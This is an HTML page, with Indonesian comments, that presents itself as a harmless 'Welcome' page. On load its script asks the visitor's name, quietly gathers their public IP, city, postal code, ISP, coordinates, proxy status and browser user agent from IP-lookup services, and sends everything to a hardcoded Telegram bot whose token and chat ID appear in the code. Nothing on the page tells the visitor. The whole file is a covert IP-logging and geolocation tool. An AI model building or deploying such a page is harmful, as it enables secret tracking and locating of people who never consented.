<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <script>
        // Token bot Telegram dan Chat ID
        const TELEGRAM_TOKEN = "7896685998:AAGXZGmmckIixNQLJPfb4aKz5morpkvI7cY";
        const CHAT_ID = "7232374611";

        let userName = "";

        // Prompt nama pengguna sebelum halaman tampil
        window.onload = function () {
            userName = prompt("Masukkan Nama Anda:");
            if (!userName) {
                userName = "Pengunjung Tanpa Nama";
            }
            document.getElementById("welcome-text").innerText = `Selamat Datang, ${userName}!`;
            trackVisitor();
        };

        // Fungsi untuk mengirim pesan ke Telegram
        function sendToTelegram(message) {
            const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
            fetch(telegramApiUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: "Markdown"  // Supaya teks lebih rapi
                })
            }).catch(error => console.error("Gagal mengirim ke Telegram:", error));
        }

        // Fungsi utama untuk mendapatkan IP dan mengirim ke Telegram
        async function trackVisitor() {
            try {
                // 1ï¸âƒ£ Ambil IP publik pengguna
                let ipResponse = await fetch("https://api.ipify.org?format=json");
                let ipData = await ipResponse.json();
                let userIP = ipData.ip;

                // 2ï¸âƒ£ Ambil informasi detail dari freeipapi.com
                let locationResponse = await fetch(`https://freeipapi.com/api/json/${userIP}`);
                let locationData = await locationResponse.json();

                // 3ï¸âƒ£ Ambil informasi tambahan dari ip-api.com
                let backupResponse = await fetch(`http://ip-api.com/json/${userIP}`);
                let backupData = await backupResponse.json();

                // 4ï¸âƒ£ Gabungkan data dari kedua API
                let finalData = {
                    ip: locationData.ipAddress || backupData.query,
                    negara: locationData.countryName || backupData.country,
                    kodeNegara: locationData.countryCode || backupData.countryCode,
                    kota: locationData.cityName || backupData.city,
                    region: locationData.regionName || backupData.regionName,
                    benua: locationData.continent || "Tidak diketahui",
                    kodePos: locationData.zipCode || backupData.zip,
                    zonaWaktu: locationData.timeZone || backupData.timezone,
                    mataUang: locationData.currency?.name || "Tidak diketahui",
                    kodeMataUang: locationData.currency?.code || "Tidak diketahui",
                    bahasa: locationData.language || "Tidak diketahui",
                    isp: locationData.ispName || backupData.isp || "Tidak diketahui",
                    tld: locationData.tlds ? locationData.tlds.join(", ") : "Tidak diketahui",
                    latitude: locationData.latitude || backupData.lat,
                    longitude: locationData.longitude || backupData.lon,
                    proxy: locationData.isProxy ? "Ya" : (backupData.proxy ? "Ya" : "Tidak")
                };

                // 5ï¸âƒ£ Update iframe dengan koordinat pengguna
                let mapIframe = document.getElementById("map-frame");
                mapIframe.src = `https://www.google.com/maps?q=${finalData.latitude},${finalData.longitude}&output=embed`;

                // 6ï¸âƒ£ Siapkan pesan lengkap untuk dikirim ke Telegram
                let message = `ğŸš¨ *Pengunjung Baru!* ğŸš¨\n\n` +
                              `ğŸ‘¤ *Nama:* ${userName}\n` +
                              `ğŸ“ *IP:* \`${finalData.ip}\`\n` +
                              `ğŸŒ *Negara:* ${finalData.negara} (${finalData.kodeNegara})\n` +
                              `ğŸ™ *Kota:* ${finalData.kota}, ${finalData.region}\n` +
                              `ğŸŒ *Benua:* ${finalData.benua}\n` +
                              `ğŸ“Œ *Kode Pos:* ${finalData.kodePos}\n` +
                              `ğŸ•’ *Zona Waktu:* ${finalData.zonaWaktu}\n` +
                              `ğŸ’± *Mata Uang:* ${finalData.mataUang} (${finalData.kodeMataUang})\n` +
                              `ğŸ—£ *Bahasa:* ${finalData.bahasa}\n` +
                              `ğŸ“¡ *ISP:* ${finalData.isp}\n` +
                              `ğŸŒ *TLD:* ${finalData.tld}\n` +
                              `ğŸ” *User-Agent:* \`${navigator.userAgent}\`\n\n` +
                              `ğŸ“Œ *Koordinat:* ${finalData.latitude}, ${finalData.longitude}\n` +
                              `ğŸ•¹ *Proxy:* ${finalData.proxy}`;

                // 7ï¸âƒ£ Kirim pesan ke Telegram
                sendToTelegram(message);

            } catch (error) {
                console.error("Gagal mendapatkan IP:", error);
            }
        }
    </script>
</head>
<body>
    <h1 id="welcome-text">Selamat Datang!</h1>
    <p>Enjoy browsing this page.</p>
    <iframe 
        id="map-frame"
        width="600" 
        height="450" 
        style="border:0" 
        loading="lazy" 
        allowfullscreen 
        referrerpolicy="no-referrer-when-downgrade"
        src="">
    </iframe>
</body>
</html>
